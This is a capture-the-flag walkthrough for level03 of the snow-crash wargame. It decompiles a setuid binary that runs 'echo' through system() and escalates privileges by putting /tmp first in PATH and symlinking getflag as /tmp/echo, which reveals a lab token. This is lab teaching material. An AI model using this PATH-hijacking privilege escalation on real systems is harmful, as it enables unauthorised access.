# level03

## Steps

1. __Action__ (Guest): list the files present at the root
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals a `level03` file
	```
	.bash_logout  .bashrc  level03  .profile
	```

3. __Action__ (Guest): get more information on the file
	```sh
	getfacl level03
	```

4. __Observation__ (Guest): the previous command reveals the file is an
	executable and has the `setuid` and the `setgid` bits enabled
	```
	# file: level03
	# owner: flag03
	# group: level03
	# flags: ss-
	user::rwx
	group::r-x
	other::r-x
	```

4. __Action__ (Guest): execute the executable
	```sh
	./level03
	```

5. __Observation__ (Guest): the message `Exploit me` appears on stdout

6. __Action__ (Host): copy the `level03` file from the virtual machine
	```sh
	sshpass -f snow-crash/level02/flag \
	scp -P 4242 level03@192.168.56.101:/home/user/level03/level03 level03
	docker cp snow-crash:level03 level03
	```

7. __Action__ (Host): decompile the `level03` file using [dogbolt](https://dogbolt.org/)

8. __Observation__ (Host): a few things are to observe here
	```c
	// ------------------------ Functions -------------------------

	// From module:   /home/user/level03/level03.c
	// Address range: 0x80484a4 - 0x8048505
	// Line range:    7 - 18
	int main() {
		int32_t v1 = getegid(); // 0x80484ad
		int32_t v2 = geteuid(); // 0x80484b6
		setresgid(v1, v1, v1);
		setresuid(v2, v2, v2);
		return system("/usr/bin/env echo Exploit me");
	}
	```
	- The effective GID and UID are stored in variables `v1` and `v2`.
	- Those variables are used to set the real, effective and saved ID of both the user and group.

9. __Observation__ (Guest): we need to run `getflag` when running `./level03`
	as we'll have the same ID as `flag03` when we'll do it. This will be done
	by creating a symbolic link between the `getflag` and the `echo` commands

10. __Action__ (Guest): create a symbolic link between `getflag` and `echo`
	adding a new path in `PATH`
	```sh
	export PATH=/tmp:$PATH
	ln -s $(which getflag) /tmp/echo
	```

11. __Action__ (Guest): execute `./level03`
	```sh
	./level03
	```

12. __Observation__ (Guest): the flag is displayed on stdout
	```
	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
	```
